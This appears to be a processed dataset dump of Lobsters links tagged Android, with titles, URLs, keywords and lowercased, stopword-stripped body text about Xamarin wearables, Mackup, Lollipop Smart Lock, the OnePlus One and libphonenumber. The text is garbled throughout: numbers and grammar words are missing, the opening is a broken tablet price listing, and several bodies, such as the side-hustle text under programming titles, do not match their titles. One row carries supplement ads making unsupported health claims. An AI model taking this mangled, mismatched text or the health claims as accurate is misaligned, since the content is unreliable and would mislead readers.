unknown ounce microsoft surface pro x price aug pst detail screen inch pixel x storage gb ram gb weight ounce samsung galaxy view price aug pst detail screen inch pixel x storage gb ram gb weight ounce microsoft surface price aug pst detail screen inch pixel x storage gb ram gb weight ounce apple ipad pro price aug pst detail screen inch pixel x storage gb ram gb weight ounce lenovo yoga tab price aug pst detail screen inch pixel x storage gb ram gb weight ounce victbing price aug pst detail screen inch pixel x storage gb ram gb weight ounce microsoft surface pro price aug pst detail screen inch pixel x storage gb ram gb weight ounce dragon touch plus price aug pst detail screen inch pixel x storage gb ram gb weight unknown ounce microsoft surface pro x price aug pst detail screen inch pixel x storage gb ram gb weight ounce microsoft surface pro price aug pst detail screen inch pixel x storage gb ram gb weight ounce contixo price aug pst detail screen inch pixel x storage gb ram gb weight ounce lenovo yoga tab pro price aug pst detail screen inch pixel x storage gb ram gb weight ounce apple ipad pro price aug pst detail screen inch pixel x storage gb ram gb weight ounce samsung galaxy tab price aug pst detail screen inch pixel x storage gb ram gb weight ounce winsing price aug pst detail screen inch pixel x storage gb ram gb weight ounce microsoft surface pro price aug pst detail screen inch pixel x storage gb ram gb weight ounce beyondtab price aug pst detail screen inch pixel x storage gb ram gb weight ounce apple ipad air price aug pst detail screen inch pixel x storage gb ram gb weight ounce asus zenpad price aug pst detail screen inch pixel x storage gb ram gb weight ounce microsoft surface pro price aug pst detail screen inch pixel x storage gb ram gb weight ounce lenovo thinkpad price aug pst detail screen inch pixel x storage gb ram gb weight ounce price aug pst detail screen inch pixel x storage gb ram gb weight ounce
467,Lobsters,android,Android,Getting Started with Android Wearables using Xamarin and Visual Studio,http://www.geekswithblogs.net/dotNETvinz/archive/2015/02/12/getting-started-with-android-wearable-using-xamarin-and-visual-studio.aspx,getting started android wearable using xamarin visual studio,wearable device xamarin setting development environment creating simple android wear application http developerxamarincomguidesandroidgettingstarted folder purpose running application http developerxamarincomsamplesandroidandroid,wearable device term wearable device wearable refer electronic technology computer incorporated item clothing accessory comfortably worn body example google glass smart watch opportunity explore android wearable device particularly smart watch decided use xamarin visual studio following reason xamarin allows build crossplatform apps io andriod window app using c experienced c developer familiar visual studio development tool give le learning curve learn use framework editor tool programming language build native apps take advantage cool feature provided xamarin cloud testing app monitoring xamarin visual studio quite popular stable platform building real world apps opportunity work android wearable exciting getting popular nowadays yes exciting time scary nt much experience technology smart watch device android stuff mean learn scratch everything work technology android framework also aware bit learning curve deal working technology completely different compared web development writing post guide new comer like get started android wear application development setting development environment first thing need install necessary tool first need install visual studio using visual studio make sure professional higher version xamarin extension visual studio supported nonexpress edition see http xamarincomfaq detail case used visual studio ultimate version installed supported version visual studio go head download xamarin extension visual studio http xamarincomvisualstudio start free trial license version follow instruction download wizard complete note may take longer depending framework installing may need restart machine reflect everything installed machine launch visual studio able see following item tool menu ensure everything need installed verify android sdk manager go tool android android sdk manager open following window think everything need installed congratulation start creating awesome android app using xamarin within visual studio creating simple android wear application let go ahead create new project within visual studio template select android wear app android able see something like click ok let visual studio generate necessary file build wear app image show generated file default sample code get started working building wear apps easy right anatomy xamarinandroid application taken official documentation http developerxamarincomguidesandroidgettingstarted folder purpose reference contains assembly required build run application expand reference directory see reference net assembly system systemcore systemxml well reference xamarin monoandroid assembly component component directory house readymade feature xamarin component store public marketplace xamarin code information xamarin component refer xamarin component walkthrough asset contains file application need run including font local data file text file file included accessible generated asset class information android asset see xamarin using android asset guide property contains androidmanifestxml file describes requirement xamarinandroid application including name version number permission property folder also house assemblyinfocs net assembly metadata file good practice fill file basic information application resource contains application resource string image layout access resource code generated resource class android resource guide provides detail resource directory application template also includes concise guide resource aboutresourcestxt file running application order u run application need first setup emulator create one following step go tool andriod andriod emulator manager simply click avd icon tool bar see android device manager window show edit start create delete repair virtual device click create button following window open allows select device want create case need create virtual android wear device u run application emulator everything set click ok create emulator done able see device created click start launch run emulator background note may take time load emulator emulator loaded ready able see name virtual device created start debugging dropdown like set application startup project run pressing sample output wear application running within emulator want refer wear app example visit link http developerxamarincomsamplesandroidandroid hope someone find post useful next blog post demonstrate debugging installing uninstalling wear apps within real wearable device stay tuned
468,Lobsters,android,Android,Android Permissions Explained,http://developer.telerik.com/featured/android-permissions-explained/,android permission explained,challenge partnership community deliver expected,challenge demand better user experience continues grow time develop high quality modern engaging application continues shrink stop sweating ui focus part application truly make differencepartnership community like developer purpose life make developer superheroes enabling deliver expected faster expected nearly two decade partnering community two million developer help cut development time increase productivity make easy embrace latest technology user experience trendsdeliver expected using modern featurerich professionally designed ui component telerik kendo ui armed everything need deliver outstanding web mobile desktop experience le timewith backing legendary technical support provided directly developer build product confident best partner rely journey
469,Lobsters,android,Android,Sync App Settings in Dropbox with Mackup,http://blog.wadegarrett.com/2015/02/17/sync-app-settings-in-dropbox-with-mackup/,sync app setting dropbox mackup,mackup sayz lim organizes file mackup online backup safe dropsync mackup mackup mackup mackup google drive copy mackup documentation getting started mackup homebrew mackup mackup mackupcfg filesystem dropbox mackupcfg storage configuration mackup mackup mackup documentation mackup bettertouchtool mackup backup mb mackup sparkle application sync application ignore mackupcfg mackup,using mackup since use primary filesystem online backup thanks article sayz lim organizes file us mackup online backup able use setup template help create setup one thing adopted safe directory use backup device application setting nexus use dropsync backup app also full backup phone backup app specific file mac exentsions chromebook creating symlinks file yesterday setup mackup mackup communitydriven tool used backup restore system application setting mackup make easy backup sync setting cloud mackup google drive copy read mackup documentation information see list supported application getting started mackup o x easily install mackup using homebrew brew install mackup mackup us dropbox default work year back installed new ssd removed optical drive favor original hdd came macbook pro dropbox directory located setup mackup use dropbox directory need create mackup config file mackupcfg vi mackupcfg order work use filesystem storage engine rather dropbox mackupcfg look like storage configuration storage engine filesystem path volumeshdd directory mbp chose manually set apps wanted mackup sync ignore created handful custom configs apps supported mackup information creating custom app configs view mackup documentation also made custom config app mackup support bettertouchtool running mackup backup first time bettertouchtool directory using mb mackup bettertouchtool config simply excludes directory mackup config sparkle application sync applicationstosync adium bartender bash bettertouchtool bundler caffeine dotfiles hazel heroku insurgency mackup moom pow smcfancontrol ssh textual transmission transmit usboverdrive xtrafinder application ignore applicationstoignore adobelightroom xcode got mackup configured time run command sync setting mackup backup command create symlink application designated mackupcfg file sync setting mackup
470,Lobsters,android,Android,Develop a Simple Application Using PhoneGap API with jQuery Mobile,http://webdesignpool.com/developing-cross-platform-mobile-apps-with-phonegap-and-jquery,develop simple application using phonegap api jquery mobile,drive rideshare company uber lyft buy sell get return investment amazon post gig fiverr fiverr help business owner social medium seo cape town teach english nonnative speaker become pet sitterdog walker donate plasma,looking make extra cash without getting second job want make money without commitment probably looking flexible side hustle would work around schedule lot fun easy way earn money side even currently fulltime job check following seven unique side hustle worth try drive rideshare company working vehicle license could always work rideshare company uber lyft set schedule work often want may want spend weekend driving company people taking ride get want go however entirely neither rideshare company service expects driver work set time always option driving picking people many hour would like even car always use bicycle provide service ubereats doordash postmates working company would go restaurant grab food order deliver order directly customer great solution without vehicle would still like earn extra money buy sell get return investment know make decent money purchasing item clearance thrift store reselling need go local store walmart target look item clearance section also check thrift store area see find grabbing great item reasonable rate post online amazon ebay sell higher price get return investment post gig fiverr fiverr site allows post kind service offer individual example might large social medium following would willing post link video business owner get word product sell offer social medium promotion web design ebook formatting earn quick cash convenience help business owner social medium good social medium know naturally bring lot follower use skill help business owner many business owner time patience use social medium want work strengthening online presence offer provide social medium service help business owner get follower customer another variation help customer seo cape town get ranking key search term business need teach english nonnative speaker would like teach english people country several apps allow individual united state work remotely teaching child adult english different lesson plan set schedule work hour want making new friend around world become pet sitterdog walker love animal offer become pet sitter dog walker side becoming dog walker great get exercise spend time outdoors earning extra money offer watch pet people going away vacation business trip donate plasma one relaxing way earn extra cash donate plasma average person donate plasma twice week potentially earning week month painful take long complete donation process paid spot wait around cash need hundred extra dollar per month great side hustle want earn extra money best way fact participate several side hustle earn much want
471,Lobsters,android,Android,Learn How to Code With Online Resources – Free and Paid,http://webdesignpool.com/learn-programming-online,learn code online resource free paid,drive rideshare company uber lyft buy sell get return investment amazon post gig fiverr fiverr help business owner social medium seo cape town teach english nonnative speaker become pet sitterdog walker donate plasma,looking make extra cash without getting second job want make money without commitment probably looking flexible side hustle would work around schedule lot fun easy way earn money side even currently fulltime job check following seven unique side hustle worth try drive rideshare company working vehicle license could always work rideshare company uber lyft set schedule work often want may want spend weekend driving company people taking ride get want go however entirely neither rideshare company service expects driver work set time always option driving picking people many hour would like even car always use bicycle provide service ubereats doordash postmates working company would go restaurant grab food order deliver order directly customer great solution without vehicle would still like earn extra money buy sell get return investment know make decent money purchasing item clearance thrift store reselling need go local store walmart target look item clearance section also check thrift store area see find grabbing great item reasonable rate post online amazon ebay sell higher price get return investment post gig fiverr fiverr site allows post kind service offer individual example might large social medium following would willing post link video business owner get word product sell offer social medium promotion web design ebook formatting earn quick cash convenience help business owner social medium good social medium know naturally bring lot follower use skill help business owner many business owner time patience use social medium want work strengthening online presence offer provide social medium service help business owner get follower customer another variation help customer seo cape town get ranking key search term business need teach english nonnative speaker would like teach english people country several apps allow individual united state work remotely teaching child adult english different lesson plan set schedule work hour want making new friend around world become pet sitterdog walker love animal offer become pet sitter dog walker side becoming dog walker great get exercise spend time outdoors earning extra money offer watch pet people going away vacation business trip donate plasma one relaxing way earn extra cash donate plasma average person donate plasma twice week potentially earning week month painful take long complete donation process paid spot wait around cash need hundred extra dollar per month great side hustle want earn extra money best way fact participate several side hustle earn much want
472,Lobsters,android,Android,"BlackBerry CEO prods regulators for 'app neutrality,' wants cross-platform iMessage",http://appleinsider.com/articles/15/01/22/blackberry-ceo-prods-regulators-for-app-neutrality-wants-cross-platform-imessage,blackberry ceo prod regulator app neutrality want crossplatform imessage,wrote,comparing net neutrality debate expansion railroad century blackberry ceo john chen tuesday called authority force company apple netflix make service available consumer regardless platform carrier like railway last century building track carry traffic point throughout country chen wrote blog post adapted letter sent member congress railway car travelling track today internet world controlled carrier content application provider therefore truly open internet policymakers demand openness traffictransport layer also contentapplications layer ecosystem chen specifically called apple imessage netflix example two popular service available consumer running blackberry device developer preference support two largest platform created twotiered wireless broadband ecosystem iphone android user able access far content application customer using device running operating system argues expected chen pointed blackberry content neutrality strategy seen company open blackberry messenger blackberry enterprise server io android relatively recent tactic however service available blackberry subscriber nearly decade introduction decision open bbm reportedly source major internal strife blackberry company cofounder jim balsillie pushing hard move severing tie company thenceo thorsten heins killed plan abject failure blackberry smartphones left company even behind apple io google android device program reinstated chen prominent figure taking rein blackberry company remains major player enterprise neither likely help push idea app neutrality however given economic burden would place smaller company highly intrusive nature regulation
473,Lobsters,android,Android,Dissecting Lollipop's Smart Lock,http://nelenkov.blogspot.com/2014/12/dissecting-lollipops-smart-lock.html,dissecting lollipop smart lock,security enhancement blogged trust agent trust agent api granting trust requested sample app nfc unlock previous post otp sample application smart lock geofencing technology established without key uid specification proxmark iii summary,android lollipop new feature introduced benchmarked complained extensively new release also includes number security enhancement disk encryption gotten probably medium attention smart lock originally announced google io allows bypassing device lockscreen certain environmental condition met probably uservisible new security feature also discussed blogged extensively however smart lock proprietary feature incorporated google play service many detail implementation security level available post look android framework extension smart lock build upon show use create unlock method finally briefly discus play service implementation trust agent smart lock build upon new lollipop feature called trust agent quote framework documentation trust agent service notifies system whether belief environment device trusted exact meaning trusted trust agent define trust agent belief trust current environment notifies system via callback system decides relax security configuration device current android incarnation trusted environment grant user ability bypass lockscreen trust granted per user user trust agent configured differently additionally trust granted certain period time system automatically reverts untrusted state period expires device administrator set maximum trust period trust agent allowed set disable trust agent altogether trust agent api trust agent android service extend trustagentservice base class available public sdk base class provides method enabling trust agent setmanagingtrust granting revoking trust grantrevoketrust well number callback method shown public class trustagentservice extends service public void onunlockattempt boolean successful public void ontrusttimeout private void onerror string msg slogv tag remote exception msg public boolean onsettrustagentfeaturesenabled bundle option return false public final void granttrust final charsequence message final long durationms final boolean initiatedbyuser public final void revoketrust public final void setmanagingtrust boolean managingtrust override public final ibinder onbind intent intent return new trustagentservicewrapper picked system trust agent need declared androidmanifestxml intent filter androidservicetrusttrustagentservice action require bindtrustagent permission shown ensures system bind trust agent bindtrustagent permission requires platform signature binder api allows calling agent process provided trustagentservice base class manifest usespermission android name androidpermissioncontrolkeyguard usespermission android name androidpermissionprovidetrustagent application service android exported true android label stringappname android name ghettotrustagent android permission androidpermissionbindtrustagent intentfilter action android name androidservicetrusttrustagentservice category android name androidintentcategorydefault intentfilter metadata android name androidservicetrusttrustagent android resource xmlghettotrustagent service application manifest system setting app scan app package match intent filter shown check hold providetrustagent signature permission defined android package show trust agent screen setting security trust agent required condition met currently single trust agent supported first matched package shown additionally manifest declaration contains metadata tag point xml resource defines setting activity see example menu entry open setting activity injected security setting screen trustagent xmlns android http schemasandroidcomapkresandroid android title ghetto unlock android summary bunch unlock trigger android settingsactivity ghettotrustagentsettings trusted agent screen might look like system app declares trusted agent installed trust agent inactive default unless part system image activated user toggle switch screen active agent ultimately managed system trustmanagerservice also keep log trustrelated event get current trust state dump even log using dumpsys command shown adb shell dumpsys trust trust manager state user owner current enabled agent orgnickghettounlockghettotrustagent event trusttimeout agentghettotrustagent trusttimeout agentghettotrustagent trusttimeout agentghettotrustagent granting trust trust agent installed trust grant triggered observable environment event directly user example via authentication challenge often requested particularly secure unless using profile authenticates wifi access point unlock trigger connecting home wifi ap feature easily implemented using broadcast receiver reacts androidnetwifistatechange see sample app based sample aosp trusted ssid detected receiver need call granttrust method trust agent service achieved number way service receiver package straightforward way use localbroadcastmanager part support library send local broadcast shown static void sendgranttrust context context string message long durationms boolean initiatedbyuser intent intent new intent actiongranttrust intentputextra extramessage message intentputextra extraduration durationms intentputextra extrainitiatedbyuser initiatedbyuser localbroadcastmanagergetinstance context sendbroadcast intent receiver override public void onreceive context context intent intent wifimanagernetworkstatechangedactionequals intentgetaction wifiinfo wifiinfo wifiinfo intent getparcelableextra wifimanagerextrawifiinfo securessidequals wifiinfogetssid ghettotrustagentsendgranttrust context ghettotrustagent wifi false call trustagentservicecallback installed system lockscreen effectively set peruser trusted flag flag true lockscreen implementation allows keyguard dismissed without authentication trust timeout expires user must enter pattern pin password order dismiss keyguard current trust state displayed bottom keyguard padlock icon unlocked current environment trusted locked explicit authentication required user also manually lock device pressing padlock even active trust agent currently trust nfc unlock discussed previous post implementing nfc unlock previous android version possible required modification system nfcservice nfc controller polled lockscreen displayed order make implementing nfc unlock possible lollipop introduces several hook nfcservice allow nfc polling lockscreen matching tag discovered reference live tag object passed interested party let look implementation bit detail nfcadapter class couple new hidden method allow adding removing nfc unlock handler addnfcunlockhandler removenfcunlockhandler respectively nfc unlock handler implementation nfcunlockhandler interface shown interface nfcunlockhandler public boolean onunlockattempted tag tag registering unlock handler must specify nfcunlockhandler object also list nfc technology polled lockscreen calling addnfcunlockhandler method requires writesecuresettings signature permission multiple unlock handler registered tried turn one return true onunlockattempted terminates nfc unlock sequence nt actually dismiss keyguard order unlock device nfc unlock handler work trust agent order grant trust judging nfcservice commit log appears fairly recent development initially setting app included functionality register trusted tag would automatically unlock device based tag uid functionality removed favour trust agent unlock handler authenticate scanned nfc tag variety way depending tag technology passive tag contain fixed data authentication typically relies either tag unique id shared secret written tag active tag execute code anything otp fullblown multistep mutual authentication however nfc communication fast tag limited processing power simple protocol roundtrips preferable simple implementation requires tag sign random value rsa private key verifies signature using corresponding public key included sample application signature verification work trust agent need initialized tag public key case imported via trust agent setting activity shown smart lock smart lock marketing name googletrustagent included google play service comgoogleandroidgms package seen dumpsys output adb shell dumpsys trust trust manager state user owner current enabled agent comgoogleandroidgmsauthtrustagentgoogletrustagent message trust agent offer several trust trigger trusted device trusted place trusted face trusted face rebranding face unlock method found previous version us proprietary image recognition technology significantly usable enabled keyguard continuously scan matching face instead requiring stay still take process picture security level provided also remains fairly low trusted face setup screen warns trusted place based geofencing technology available google play service trusted place use home work location associated google account make setup easier also allows registering custom place based current location coordinate selectable via google map helpful popup warns accuracy guaranteed trusted place range meter practice device remain unlocked even distance exceeded trusted device support two different type device time writing bluetooth nfc bluetooth option allows android device remain unlocked paired bluetooth device range feature relies bluetooth builtin security mechanism security depends paired device newer device android wear watch pebble watch support secure simple pairing security mode us elliptic curve diffiehellman ecdh order generate shared link key paring process device display number based hash device public key order provide device authentication protect mitm attack feature called numeric comparison however older wearable meta watch bluetooth earphone others also supported previousgeneration device support standard pairing generates authentication key based device physical address pin usually fixed set wellknow value device easily impersonated google smart lock implementation requires persistent connection trusted device trust revoked connection broken update apparently trusted connection established without key android however introductory screen see warns bluetooth range highly variable may extend meter thus keep device unlocked connected trusted watch wrist use case make lot sense practice android device may remain unlocked even trusted bluetooth device wearable etc another room discussed earlier nfc trusted device quite flexible advantage unlike bluetooth proximity well defined typically centimeter google smart lock seems support active nfc device internally referred precious tag device publicly announced yet precious found google nfcbased trust agent fall back uidbased authentication saving hash scanned tag uid tag registration screen shown popular nfca tag mifare variant uid byte long uids also theoretically supported using uid authentication fairly widespread practice originally intended anticollision alone authentication uids necessarily unique may collide even official nxp tag specification requires id unique even across different manufacturer readonly card rewritable uid exists cloning mifare trusted tag quite possible tag also emulated programmable device proxmark iii therefore security level provided uidbased authentication high summary android lollipop introduces new trust framework based trust agent notify system device trusted environment system lockscreen listens trust event change behaviour based trust state current user make easy augment replace traditional patternpinpassword user authentication method installing trust agent trust agent functionality currently available system application lollipop support single active trust agent google play service provides several trust trigger trustlets name smart lock via trust agent greatly improve device usability none currently available smart lock method particularly precise secure used care
476,Lobsters,android,Android,Why Android Lollipop takes the cake,http://www.business-standard.com/article/technology/why-android-lollipop-takes-the-cake-114113000607_1.html,android lollipop take cake,material design better battery lockscreen feature notification recent apps card new funfilled easter egg tailpiece,unveiled june year google io android lollipop l finally rolled major device running google stock android operating system performancewise significant change come along android l android runtime art replaces dalvik application runtime environment basically convert code running application let keep away ohso technical aspect take look new feature come android l material design probably biggest visual change give android l distinct look introduction material design idea behind material design make sure android user get interactive responsive interface motion transition colour response form backbone animation android l entry official google blog said content responds touch transition task fluid three main utility touchscreen key geometrical shape triangle back button circle home square recent activity product logo also refreshed user also notice new flattened keyboard moreover every app pop come somewhere button grid respond every touch better battery android l announced doubt performance battery backup device apart nexus come preloaded latest version android would device like nexus nexus adapt update worry laid rest google project volta feature come new battery saver mode also promise provide least minute extra battery battery saver mode system prompt user battery level soon reach per cent user also choose let saver mode start battery reach critical level moment battery saver mode switched screen get encapsulated orange background animation become bit jittery something negligible given choice stuttering animation juice least minute would go latter overall performance battery improved immensely lockscreen feature notification lockscreen android l revamped swipe unlock screen digital clock plunge take home screen user access notification directly lockscreen unlike previous notification system background remains transparent user checking notification also onetouch button dismiss notification new notification panel look brilliant replete feature available previous version android flashlight thirdparty apps required autorotate castscreen option notification hub staying front one unique option set priority notification press volume rocker nexus set notification alert one good update option receive call without exiting current app middle document spreadsheet app incoming call appears top without overlapping current app coming voice notification ok google hotword detection also taken new level like moto x user wake device without unlocking screen recent apps card recent apps system prevalent android kitkat previous version o replaced recent activity system come form stack card interestingly browser apps tab google chrome etc open also line stack card card system look feel smooth still either swipe close apps using close button top right new funfilled easter egg new update come new easter egg remember flappy bird sidescroller game became phenomenon overnight earlier year game longer available app store google play store still get taste android l easter egg take route reach hidden easter egg reach setting scroll end list enter phone fall system inside phone see android version showing quick tap grid enter easter egg keep clicking screen show lollipop every click change colour swipe lollipop enter game rule level addiction tailpiece mainly hit couple miss instance silent mode android l user keep device vibration mode also gallery app done away picture photo app take time get used photo app since different way categorising album auto backup feature toggled also android l usage experience may differ device device tried latest update lg google nexus new update feature may exhibit different user battery experience device nexus nexus device running stock android instance moto g moto x
477,Lobsters,android,Android,NVIDIA starts rolling out Android 5.0 Lollipop for the Shield Tablet LTE,http://beforeitsnews.com/science-and-technology/2014/11/nvidia-starts-rolling-out-android-5-0-lollipop-for-the-shield-tablet-lte-2734076.html,nvidia start rolling android lollipop shield tablet lte,android lollipop shield tablet grid gaming service nvidia twitter nvidia start rolling android lollipop shield tablet lte androidspin http join united stand click create personal citizen journalist account today sure invite friend please help support beforeitsnews trying natural health product order phone online http mitocoppercom order phone online http wwwherbanomiccom get free ebook suppressed health secret natural cure nt want know humic fulvic trace mineral complex nature important supplement vivid dream ultimate clinical potency curcumin natural pain relief reduce inflammation much mitocopper oxy powder natural colon cleanser clean toxic buildup oxygen organic hemp extract cbd full spectrum high cbd hemp extract eas stiff joint relief stress nascent iodine promotes detoxification mental focus thyroid health smart meter cover reduces smart meter radiation see video immusist beverage concentrate proprietary blend formulated reduce inflammation hydrating oxygenating cell,reader think story fact add two cent think thanksgiving think food beverage family probably stand forced spend time rare family genuinely like often always thrilled holiday one get gaming one way nvidia shield tablet lte great way get away people house nvidia rolling special little treat help get food antic crazy aunt starting android lollipop available nvidia shield tablet lte owner along o update also get enhanced version nvidia drawing app dabbler grid gaming service free june slew new title shield tablet lte jump wifi see update waiting download install sure well battery life begin get install let u know work via nvidia twitter post nvidia start rolling android lollipop shield tablet lte appeared first androidspin source http community individual report going around around world anyone join anyone contribute anyone become informed world united stand click create personal citizen journalist account today sure invite friend please help support beforeitsnews trying natural health product order phone online http mitocoppercomorder phone online http wwwherbanomiccom get free ebook suppressed health secret natural cure nt want know humic fulvic trace mineral complex nature important supplement vivid dream ultimate clinical potency curcumin natural pain relief reduce inflammation much mitocopper bioavailable copper destroys pathogen give energy see blood video oxy powder natural colon cleanser clean toxic buildup oxygen organic hemp extract cbd full spectrum high cbd hemp extract eas stiff joint relief stress nascent iodine promotes detoxification mental focus thyroid health smart meter cover reduces smart meter radiation see video immusist beverage concentrate proprietary blend formulated reduce inflammation hydrating oxygenating cell
478,Lobsters,android,Android,OnePlus One Review,"http://www.tomshardware.com/reviews/oneplus-one-smartphone,3992.html",oneplus one review,oneplus one two good true oneplus one tech spec oneplus one htc one apple iphone plus availability option,today best oneplus one dealsoneplus one two good true google nexus phone gained popularity pairing uncluttered android experience good hardware affordable price ascension nexus high perch premium priced android flagship distinct opportunity player google capture market oneplus want fill void left nexus affordable flagship oneplus onefounded december pete lau previously vice president oppo electronics oneplus newcomer smartphone market created around mantra never settle oneplus strives deliver premium product focus solely feature customer find useful although direct link oppo oneplus insists separately run company image credit oneplus oneplus managed create lot buzz around first device oneplus one part device scarcity oneplus one purchased via oneplus website receiving special invitation invitation distributed oneplus promotional event oneplus forum social medium additionally person buy one receives invitation give friend invitation system interrupted brief period starting october time generally available publicinterest one also stoked impressive list hardware oneplus one come snapdragon soc ram display camera mah battery matching hardware many current flagship android phone also ship cyanogenmod popular android community rom known lean highly customizable even impressive price one start around half price flagship competitorsoneplus one tech spec oneplus one htc one apple iphone plus term hardware oneplus one compare favorably flagship phone like samsung galaxy lg htc one thing missing support microsd card removable battery speaking battery one power cell larger found lg iphone plus smaller cell samsung note larger image frontal area width x height weight oneplus one le value plus note foregoing physical capacitive button lg requires le bezel area allowing shorter narrower lighter one even though size screenavailability optionsthe oneplus one purchased oneplus website receive invite starting october oneplus offering one general public brief period timethe one support four gsm frequency mhz five umtswcdma frequency mhz give good global coverage also support lte band u one compatible tmobile sprint verizon also since phone purchased directly oneplus arrives unlockedthere two different color onboard storage option oneplus one silk white gb sandstone black gb white version smooth glossy finish black model come grippy texture image credit oneplus really get unlocked flagship phone looking list hardware answer seems yes paraphrase yoda hardware spec make one great live flagship killer moniker one also need attractive appearance good inhand feel feature rich bugfree software strong performance longlasting battery
479,Lobsters,android,Android,Become Part of the Web of Apps: Developers tricks to increase mobile app usage,http://blogs.telerik.com/blogs/14-11-18/become-part-of-the-web-of-apps-developers-tricks-to-drive-app-engagement-up,become part web apps developer trick increase mobile app usage,app index become part web apps app index tutorial deep link reengage user deep linking deep linking foundation new mobile web tag apps lose time republishing app every single update android io web apps ui android ui io,mobile developer facing severe limitation come app distribution app content almost invisible browser search apptoapp connection scarce app discovery channel marketplace search algorithm still evolving improving app update need go tedious resubmission process relevant marketplace let look technology help u overcome limitation app index become part web apps built android app app index yet already losing potential reengagement indexing android app mean inapp content become accessible mobile search user already installed app little green text title link informs user sent mobile app know hard get user reinteract app abandoned google app indexing great step toward making easier technically pretty simple follow tutorial get started feature available android apps make sense expect work operating system future screenshot source http developersgooglecomappindexingwebmasters deep link reengage user google app indexing available nonandroid apps app take advantage deep linking core technology google app indexing us deep linking powerful tool increase user engagement used countless scenario increase roi advertising email nurture campaign user sent relevant content even include call uber button make sense context app check deep linking foundation new mobile web deep dive deep linking image source http mobileads tag apps lose time republishing app every single update web allows realtime update content feature mobile apps practically frozen installed user device point developer push update app user base user agrees google tag manager gtm mobile apps provides effective way solve challenge extent gtm enabled apps fairly simple change configuration value apps though gtm interface without rebuild resubmit application binary app marketplace work across device support mobile website native mobile apps control configuration various ui setting display string size location language well type ad served app getting started guide walk process detail android io apps web apps marketplace probably stay place user search apps many untapped opportunity mobile app owner reach existing potential customer web apps evolve willingness mobile developer become part transformation already using technology app glad hear solve challenge mobile developer going native way check telerik ui android ui io
480,Lobsters,android,Android,libphonenumber: Google's phone number handling library,https://code.google.com/p/libphonenumber/,libphonenumber google phone number handling library,quick link highlight functionality demo java java demo latest release version number javascript javascript demo java code wiki maven repository javadoc http javadociodoccomgooglecodelibphonenumberlibphonenumber versioning announcement metadata porter libphonenumberdiscuss release tag release note libphonenumberdiscuss quick example formatting phone number type geocoding phone number mapping phone number original carrier number portability unit test thirdparty port faq http githubcommichaelrockslibphonenumberandroid http githubcomcatamphetaminelibphonenumberjs http githubcomseegnogooglelibphonenumber,google common java c javascript library parsing formatting validating international phone number java version optimized running smartphones used android framework since ice cream sandwich quick link highlight functionality parsing formatting validating phone number countriesregions world getnumbertype get type number based number able distinguish fixedline mobile tollfree premium rate shared cost voip personal number uan pager voicemail whenever feasible isnumbermatch get confidence level whether two number could getexamplenumber getexamplenumberfortype provide valid example number countriesregions option specifying type example phone number needed ispossiblenumber quickly guess whether number possible phone number using length information much faster full validation isvalidnumber full validation phone number region using length prefix information asyoutypeformatter format phone number onthefly user enter digit findnumbers find number text phonenumberofflinegeocoder provides geographical information related phone number phonenumbertocarriermapper provides carrier information related phone number phonenumbertotimezonesmapper provides timezone information related phone number demo java java demo updated slight delay github release last demo update number lower latest release version number release demo may either version javascript javascript demo may run various tag link take master j demo link working rawgit deprecated todo host alternative platform java code include java code application either integrate maven see wiki download latest jar maven repository javadoc javadoc automatically updated reflect latest release http javadociodoccomgooglecodelibphonenumberlibphonenumber versioning announcement generally choose release number following guideline change pushed master since last release incompatible intent specification existing libphonenumber api may cause libphonenumber java c j client change code keep building publish major release example last release new one would change enable client update code take advantage new functionality client would rollback change event release marked bad publish minor release example go otherwise including release contains metadata change publish subminor release eg sometimes make internal change code metadata affecting compatibility client could affect compatibility porter library change make announcement libphonenumberdiscuss change reflected version number would publish subminor release change want get notified new release year excepting holiday extenuating circumstance release fortnightly update release tag document detailed release note also send announcement libphonenumberdiscuss every release quick example let say string representing phone number switzerland parsenormalize phonenumber object string swissnumberstr phonenumberutil phoneutil phonenumberutilgetinstance try phonenumber swissnumberproto phoneutilparse swissnumberstr ch catch numberparseexception e systemerrprintln numberparseexception thrown etostring point swissnumberproto contains countrycode nationalnumber phonenumber class originally autogenerated phonenumberproto necessary modification efficiency detail meaning field refer resourcesphonenumberproto let u validate whether number valid boolean isvalid phoneutilisvalidnumber swissnumberproto return true format supported formatting method illustrated produce systemoutprintln phoneutilformat swissnumberproto phonenumberformatinternational produce systemoutprintln phoneutilformat swissnumberproto phonenumberformatnational produce systemoutprintln phoneutilformat swissnumberproto could also choose format number way dialed another country produce number dialed united state systemoutprintln phoneutilformatoutofcountrycallingnumber swissnumberproto u formatting phone number type phonenumberutil phoneutil phonenumberutilgetinstance asyoutypeformatter formatter phoneutilgetasyoutypeformatter u systemoutprintln formatterinputdigit output input digit systemoutprintln formatterinputdigit output geocoding phone number phonenumberofflinegeocoder geocoder phonenumberofflinegeocodergetinstance output zurich systemoutprintln geocodergetdescriptionfornumber swissnumberproto localeenglish output zürich systemoutprintln geocodergetdescriptionfornumber swissnumberproto localegerman output zurigo systemoutprintln geocodergetdescriptionfornumber swissnumberproto localeitalian mapping phone number original carrier caveat provide data current carrier phone number original carrier assigned corresponding range read number portability phonenumber swissmobilenumber new phonenumber setcountrycode setnationalnumber phonenumbertocarriermapper carriermapper phonenumbertocarriermappergetinstance output swisscom systemoutprintln carriermappergetnamefornumber swissmobilenumber localeenglish example use library found unit test thirdparty port several thirdparty port phone number library known u share case useful developer however emphasize port developer outside libphonenumber project evaluate quality influence maintenance process alternative version androidoptimized java version load metadata class getresourcesasstream asks android apps follow android loading best practice repackaging metadata loading assetmanager open faq nt want check port http githubcommichaelrockslibphonenumberandroid repackage metadata use assetmanager open may depended without needing specific loading optimization client javascript nt want use version depends closure several option including http githubcomcatamphetaminelibphonenumberjs strippeddown rewrite kb size http githubcomseegnogooglelibphonenumber browserifycompatible wrapper around original unmodified library installable via npm pack google closure library kb size
